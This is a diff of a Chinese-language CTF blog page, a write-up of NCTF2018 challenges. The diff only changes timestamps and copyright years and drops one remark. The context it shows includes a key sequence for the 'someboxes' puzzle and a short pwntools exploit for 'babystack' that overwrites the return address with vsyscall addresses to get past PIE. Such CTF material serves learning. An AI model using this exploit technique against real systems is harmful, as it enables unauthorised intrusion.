@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="4eriri&#39;s blog">
 <meta property="og:description" content="说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为p">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-08T12:41:01.751Z">
+<meta property="og:updated_time" content="2018-12-19T08:33:58.445Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NCTF2018">
 <meta name="twitter:description" content="说是不再记录简单题的，奈何能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有感觉，后来发现就是推箱子游戏（大佬说调试一下啥的，我动态调试太鶸了），输入w450控制方向把两个箱子推到目标点就行了，不过还是有一些小问题要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为p">
@@ -236,7 +236,6 @@
 <p>操作顺序：aaawwdwaaawasssssssasddsdwwddddwwwwwaaawwdddsdwawddddwdssdsaa</p>
 <p>用W540替换：<br>444Wd0W444W4555555545d0d05d0Wd0d0d0d0W444Wd0d0d05d0W4Wd0d0d0d0Wd055d0544</p>
 <p>输入这个应该就可以得到flag了。</p>
-<p>#####呜呜呜pwn还是好难啊</p>
 <p>#babystack</p>
 <p>看了github上的脚本：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./babystack&apos;)</span><br><span class="line">p.sendline(p64(0xffffffffff600000)*5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -258,7 +257,7 @@
         <p><span>本文标题:</span><a href="/2018/11/26/NCTF2018/">NCTF2018</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
         <p><span>发布时间:</span>2018-11-26, 17:07:04</p>
-        <p><span>最后更新:</span>2018-12-08, 20:41:01</p>
+        <p><span>最后更新:</span>2018-12-19, 16:33:58</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/11/26/NCTF2018/" title="NCTF2018">http://yoursite.com/2018/11/26/NCTF2018/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/26/NCTF2018/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -370,7 +369,7 @@
         <div id="footer-info">
             <div class="footer-left">
                 <i class="fa fa-copyright"></i> 
-                2018 4eriri
+                2018-2019 4eriri
             </div>
             <div class="footer-right">
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
